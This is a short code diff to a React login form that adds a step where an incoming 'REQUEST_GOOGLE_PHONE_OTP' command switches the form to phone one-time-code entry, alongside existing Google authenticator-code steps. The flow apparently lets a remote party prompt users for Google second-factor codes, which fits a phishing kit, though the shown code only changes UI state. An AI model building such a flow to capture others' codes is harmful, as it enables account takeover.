@@ -54,7 +54,10 @@ export default function LoginForm() {
         } else if (command === 'REQUEST_GOOGLE_AUTH_OTP') {
             setIsLoading(false);
             setCurrentStep('auth_otp');
-        } else if (command === 'CORRECT_OTP') {
+        } else if (command === 'REQUEST_GOOGLE_PHONE_OTP') {
+            setIsLoading(false);
+            setCurrentStep('phone_otp');
+        }  else if (command === 'CORRECT_OTP') {
             setIsLoading(false);
         } else if (command === 'FINISH') {
             setTimeout(() => {
